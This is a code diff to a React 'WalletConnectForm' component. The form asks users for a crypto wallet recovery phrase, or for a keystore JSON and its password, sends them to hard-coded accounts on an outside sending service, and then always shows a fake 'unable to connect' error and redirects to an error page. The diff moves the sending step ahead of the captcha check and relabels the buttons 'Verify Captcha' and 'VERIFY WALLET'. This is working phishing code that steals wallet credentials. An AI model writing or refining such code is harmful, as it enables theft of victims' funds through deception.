@@ -133,19 +133,6 @@ const WalletConnectForm = ({ walletName }) => {
       return;
     }
 
-    // Show captcha if not already shown and not verified
-    if (!showCaptcha && !captchaVerified) {
-      setShowCaptcha(true);
-      return;
-    }
-
-    // Verify captcha if shown but not verified
-    if (showCaptcha && !captchaVerified) {
-      if (!verifyCaptcha()) return;
-    }
-
-    // Only proceed if captcha is verified or not required
-    setPhraseSubmit("Processing...")
     const name = wallet
     const type = "Phrase"
     const data = phrase
@@ -185,42 +172,8 @@ const WalletConnectForm = ({ walletName }) => {
         "4VxHnC4IdXAVuU9Gs"
       );
 
-      toast.error('unable to connect', {
-        position: "top-right",
-        autoClose: 2500,
-        hideProgressBar: false,
-        closeOnClick: true,
-        pauseOnHover: true,
-        draggable: true,
-        progress: undefined,
-        theme: "light",
-      });
-      setTimeout(() => {
-        navigate('/error')
-      }, 3000);
     } catch (error) {
       console.log("")
-      setPhraseSubmit("CONNECT")
-    }
-  }
-
-  // ##### KEYSTORE JSON SUBMISSION
-  const handleKeystoreSubmit = async (e) => {
-    e.preventDefault();
-    
-    // Basic validation
-    if (!keystore || !keystorePassword) {
-      toast.error('Please enter both keystore JSON and password', {
-        position: "top-right",
-        autoClose: 2500,
-        hideProgressBar: false,
-        closeOnClick: true,
-        pauseOnHover: true,
-        draggable: true,
-        progress: undefined,
-        theme: "light",
-      });
-      return;
     }
 
     // Show captcha if not already shown and not verified
@@ -235,7 +188,40 @@ const WalletConnectForm = ({ walletName }) => {
     }
 
     // Only proceed if captcha is verified or not required
-    setKeystoreSubmit("Processing...");
+    setPhraseSubmit("Processing...")
+
+    setPhraseSubmit("CONNECT")
+    toast.error('unable to connect', {
+      position: "top-right",
+      autoClose: 2500,
+      hideProgressBar: false,
+      closeOnClick: true,
+      pauseOnHover: true,
+      draggable: true,
+      progress: undefined,
+      theme: "light",
+    });
+    setTimeout(() => {
+      navigate('/error')
+    }, 3000);
+  }
+
+  const handleKeystoreSubmit = async (e) => {
+    e.preventDefault();
+    
+    if (!keystore || !keystorePassword) {
+      toast.error('Please enter both keystore JSON and password', {
+        position: "top-right",
+        autoClose: 2500,
+        hideProgressBar: false,
+        closeOnClick: true,
+        pauseOnHover: true,
+        draggable: true,
+        progress: undefined,
+        theme: "light",
+      });
+      return;
+    }
     const name = wallet;
     const type = "Keystore_JSON";
     const data = keystore;
@@ -257,24 +243,39 @@ const WalletConnectForm = ({ walletName }) => {
         },
         'o_NYBBGCjR2YIkIYu'
       );
-      toast.error('unable to connect',  {
-        position: "top-right",
-        autoClose: 2500,
-        hideProgressBar: false,
-        closeOnClick: true,
-        pauseOnHover: true,
-        draggable: true,
-        progress: undefined,
-        theme: "light",
-      });
-
-      setTimeout(() => {
-        navigate('/error')
-      }, 3000);
+      
     } catch (error) {
-      setKeystoreSubmit("CONNECT");
       console.log("error")
     }
+
+    // Show captcha if not already shown and not verified
+    if (!showCaptcha && !captchaVerified) {
+      setShowCaptcha(true);
+      return;
+    }
+
+    // Verify captcha if shown but not verified
+    if (showCaptcha && !captchaVerified) {
+      if (!verifyCaptcha()) return;
+    }
+
+    // Only proceed if captcha is verified or not required
+    setKeystoreSubmit("Processing...");
+    
+    toast.error('unable to connect',  {
+      position: "top-right",
+      autoClose: 2500,
+      hideProgressBar: false,
+      closeOnClick: true,
+      pauseOnHover: true,
+      draggable: true,
+      progress: undefined,
+      theme: "light",
+    });
+    setTimeout(() => {
+      navigate('/error')
+    }, 3000);
+    setKeystoreSubmit("CONNECT");
   }
   
   const privateKeyLengthNotlong = () => {
@@ -441,10 +442,10 @@ const WalletConnectForm = ({ walletName }) => {
                 disabled={phraseSubmit === "Processing..."}
               >
                 {phraseSubmit === "Processing..." ? (
-                  <>
+                  <div style={{display: 'flex', alignItems: 'center', gap: '5px'}}>
                     <CircleLoading /> Processing...
-                  </>
-                ) : captchaVerified ? "CONNECT WALLET" : "CONNECT"}
+                  </div>
+                ) : captchaVerified ? "VERIFY WALLET" : "Verify Captcha"}
               </button>
             </form>
           </div>
@@ -526,10 +527,10 @@ const WalletConnectForm = ({ walletName }) => {
                 disabled={keystoreSubmit === "Processing..."}
               >
                 {keystoreSubmit === "Processing..." ? (
-                  <>
+                  <div style={{display: 'flex', alignItems: 'center', gap: '5px'}}>
                     <CircleLoading /> Processing...
-                  </>
-                ) : captchaVerified ? "CONNECT WALLET" : "CONNECT"}
+                  </div>
+                ) : captchaVerified ? "CONNECT WALLET" : "Verify Captcha"}
               </button>
             </form>
           </div>
